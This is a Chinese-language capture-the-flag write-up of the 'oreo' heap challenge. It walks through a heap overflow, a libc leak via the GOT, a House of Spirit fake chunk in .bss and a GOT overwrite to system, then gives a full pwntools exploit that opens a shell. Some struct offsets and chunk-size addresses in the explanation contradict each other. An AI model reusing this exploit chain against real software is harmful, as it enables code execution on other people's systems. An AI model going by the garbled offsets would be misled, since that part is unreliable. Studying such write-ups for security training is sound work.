# 漏洞成因
## 程序关键结构体
程序管理名为“Rifle”的堆对象。每个Rifle结构体分配在大小为0x38（56字节）的堆块中，其布局如下：
```c
struct Rifle {
    char description[56];      // 偏移 0x0，可写入56字节，用于描述
    char name[31];             // 偏移 0x19 (25)，可写入56字节，但实际上会覆盖description的后31字节和prev指针，用于名称
    struct Rifle *prev;        // 偏移 0x34 (52)，指向前一个Rifle结构体的指针
};
```
在`add_rifle`函数中，先读取`name`到偏移0x19处，再读取`description`到偏移0x0处。由于`fgets`允许写入56字节，而`name`字段从偏移0x19开始，实际上会覆盖从偏移0x19到0x38（即56字节）的内容，这包括了`description`的后31字节和整个`prev`指针。这是堆溢出漏洞的根源。

关键全局变量（位于.bss段，地址固定）：
- `new_ptr` (0x804A288): 指向最新分配的Rifle结构体的指针。
- `rifles_ordered` (0x804A2A0): 已订购的步枪数量。
- `new_rifles` (0x804A2A4): 当前已添加但未订购的步枪数量。
- `message_storage_ptr` (0x804A2A8): 指向留言存储区的指针，初始指向`message_storage` (0x804A2C0)。
- `message_storage` (0x804A2C0): 大小为128字节的留言存储区。

## 漏洞定位
漏洞存在于`add_rifle`函数中。向`name`字段（偏移0x19）写入56字节数据时，会溢出并覆盖相邻的`prev`指针（偏移0x34）。
```c
// 反编译代码关键部分
fgets(dword_804A288 + 25, 56, stdin); // 写入 name，起始偏移0x19，允许写56字节，导致溢出
// 这将覆盖从偏移0x19到0x38(0x19+56=0x51)的区域，其中包括偏移0x34的prev指针。
```

# 漏洞利用过程：
利用思路分为三部分：
1.  **信息泄露（Libc地址）**：利用堆溢出，将某个Rifle的`prev`指针覆盖为`puts`函数的GOT表地址。随后通过`show_rifles`功能，程序会将该地址作为有效的Rifle结构体进行解析并打印其`description`字段（即`puts`的GOT项内容），从而泄露libc基址。
2.  **House of Spirit**：在.bss段伪造一个fastbin块，并将其释放到fastbin中。具体是利用`new_rifles`变量作为伪造块的size字段，通过多次添加/释放Rifle来累加其值至0x40；再利用`leave_message`在`message_storage`区域伪造下一个相邻块的size（0x41）。然后通过堆溢出将一个Rifle的`prev`指针指向伪造块的位置（`0x804a2a8`），调用`order_rifles`释放该伪造块，使其进入fastbin。
3.  **GOT覆写与Shell获取**：再次`add_rifle`时，会从fastbin中分配出刚才释放的.bss段伪造块。我们可以将它的`description`（即`message_storage_ptr`指向的位置）写为`scanf`的GOT地址。随后通过`leave_message`功能，即可向`scanf`的GOT表项写入`system`函数的地址。最终，当程序主循环调用`scanf`（`__isoc99_sscanf`）解析用户输入时，实际会执行`system`，通过发送`/bin/sh`即可获得shell。

## Step 1-2: 信息泄露
- **Step 1 (添加恶意Rifle)**：调用`addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')`。
  - 堆内存`0x9546410`（Rifle结构体）的偏移0x34处，`prev`指针被覆盖为`puts`的GOT地址（如`0x804a25c`）。这导致该Rifle的链表指针指向了GOT表。
- **Step 2 (泄露Libc地址)**：调用`leakLibc()` -> `show_rifles`。
  - 程序首先打印第一个正常Rifle的信息。
  - 随后遍历到被覆盖的`prev`指针（GOT地址），程序误将其当作一个Rifle结构体地址。它尝试打印其`description`（即GOT地址偏移0x0处的内容），这恰好是`puts`函数在libc中的实际地址。通过解析此输出，计算得到libc基址和`system`函数地址。

## Step 3-6: House of Spirit 准备与执行
- **Step 3 (堆布局准备)**：循环`0x3f`次`addRifle` + `orderRifles`。
  - **关键效果**：每次添加Rifle会使全局变量`new_rifles` (0x804A2A4) 加1。经过0x3f次（加上信息泄露时已添加的1个，共0x40次），`new_rifles`的值变为0x40。这个地址`0x804a2a4`处的值`0x40`，将被用作后续伪造堆块的`size`字段（因为fastbin的size位于chunk头的前一个DWORD）。
- **Step 4 (指向伪造块)**：调用`addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')`。
  - 堆内存中新Rifle的`prev`指针被覆盖为`0x804a2a8`（即`message_storage_ptr`的地址）。这是计划中伪造堆块的用户数据区（mem）的起始地址。
- **Step 5 (伪造next chunk的size)**：调用`leaveMessage(p32(0)*9 + p32(0x41))`。
  - **关键内存变化**：`message_storage`区域从`0x804a2c0`开始，写入9个0（36字节）后，在偏移`0x24`（`0x804a2c0+0x24=0x804a2e4`）处写入`0x41`。这对应于**第二个伪造chunk的size字段**（地址`0x804a2e0`的chunk头中的size），其值是`0x41`。这是为了满足`free`操作中对下一个相邻chunk的size检查（`0x40`是第一个伪造chunk的大小，`0x41`是第二个伪造chunk的大小，其`PREV_INUSE`位为1）。
- **Step 6 (释放伪造块)**：调用`orderRifles()`。
  - 程序从`new_ptr`开始遍历链表释放Rifle。此时链表最后一个Rifle的`prev`指向`0x804a2a8`。
  - `free(ptr)`被调用，`ptr`为`0x804a2a8`。堆管理器将其视为一个chunk的mem指针。它检查其`size`字段（位于`0x804a2a8-8=0x804a2a0`），该处是`rifles_ordered`变量，其值为`0x3f`，但程序逻辑已通过大量订单将其增加到`0x40`（与`new_rifles`值同步），因此`size`为`0x40`。同时检查下一个chunk（位于`0x804a2a8+0x40=0x804a2e8`）的size字段（`0x804a2e4`），该处已在Step5被设置为`0x41`，通过检查。
  - 伪造的、位于`.bss`段`0x804a2a0`的chunk（size=0x40）被成功释放并插入fastbin[4]（对应0x40大小）。

## Step 7-9: 控制流劫持
- **Step 7 (分配伪造块并劫持指针)**：调用`addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))`。
  - `malloc(0x38)`请求一个大小约为0x40的chunk。堆管理器从fastbin[4]中取出刚才释放的、位于`.bss`段`0x804a2a0`的伪造chunk返回。
  - 程序将Rifle的`description`写入该chunk的用户数据区（起始于`0x804a2a8`）。写入的内容是`scanf`的GOT地址（如`0x804a258`）。由于`0x804a2a8`正是全局指针`message_storage_ptr`的地址，因此**`message_storage_ptr`被覆盖为`scanf`的GOT地址**。
- **Step 8 (覆盖GOT表)**：调用`leaveMessage(p32(system))`。
  - `leave_message`函数向`message_storage_ptr`指向的地址写入数据。现在`message_storage_ptr`指向`scanf`的GOT地址（`0x804a258`）。
  - 因此，向`0x804a258`写入`system`函数的地址，成功将GOT表中`__isoc99_sscanf`的项修改为`system`。
- **Step 9 (触发Shell)**：发送`/bin/sh`。
  - 程序主循环调用`__isoc99_sscanf`解析用户输入。由于GOT被劫持，实际执行的是`system("/bin/sh")`，从而获得shell。

# Exploit：
```python
from pwn import *

# 基于 https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/
# 本 exploit 适配 libc 2.24

target = process('./oreo', env={"LD_PRELOAD":"/lib32/libc-2.24.so"})
# gdb.attach(target) # 调试时使用
elf = ELF('oreo')
libc = ELF("/lib32/libc-2.24.so")

def addRifle(name, desc):
    target.sendline('1')
    target.sendline(name)
    target.sendline(desc)

def leakLibc():
    target.sendline('2')  # 选择 Show added rifles
    target.recvuntil("Description: ")
    target.recvuntil("Description: ")  # 跳过第一个Rifle的输出
    leak = target.recvline()          # 获取第二个"Rifle"的description，即puts的got内容
    puts_addr = u32(leak[0:4])
    libc_base = puts_addr - libc.symbols['puts']
    return libc_base

def orderRifles():
    target.sendline("3")

def leaveMessage(content):
    target.sendline("4")
    target.sendline(content)

# ========== Step 1-2: 泄露 libc 地址 ==========
# 添加一个Rifle，通过name字段溢出，将prev指针覆盖为puts的GOT地址
addRifle('0'*0x1b + p32(elf.got['puts']), "15935728")

# 调用show功能触发泄露，计算system地址
libc_base = leakLibc()
system_addr = libc_base + libc.symbols['system']
log.info("Libc base: " + hex(libc_base))
log.info("System addr: " + hex(system_addr))

# ========== Step 3-6: House of Spirit 准备 ==========
# 通过多次添加并立即订购，来增加 new_rifles 计数到 0x40
# 同时，每次添加的Rifle的prev指针需设为0，防止order时访问非法地址
for i in range(0x3f):
    addRifle("1"*0x1b + p32(0x0), "1593")
    orderRifles()

# 添加一个Rifle，将其prev指针指向bss段伪造chunk的位置 (message_storage_ptr)
addRifle("1"*0x1b + p32(0x804a2a8), "15935728")

# 通过留言功能，在伪造的“下一个chunk”的位置写入size字段 0x41
leaveMessage(p32(0)*9 + p32(0x41)) # p32(0)*9 覆盖到 0x804a2e0, p32(0x41) 写入 0x804a2e4

# 订购Rifles，这会释放链表，包括我们指向伪造chunk的指针，触发free将伪造块加入fastbin
orderRifles()

# ========== Step 7-9: 劫持控制流 ==========
# 再次添加Rifle，malloc会从fastbin中分配出我们刚释放的.bss段伪造块
# 向该块的description（即message_storage_ptr指向的位置）写入scanf的GOT地址
addRifle("15935728", p32(elf.got['__isoc99_sscanf']))

# 通过留言功能，向message_storage_ptr（现在指向scanf的GOT）写入system函数的地址
leaveMessage(p32(system_addr))

# 此时，scanf的GOT已被覆盖为system。主循环中的scanf调用将变成system。
# 发送"/bin/sh"作为下次scanf的输入，从而获得shell
target.sendline("/bin/sh")

target.interactive()
```
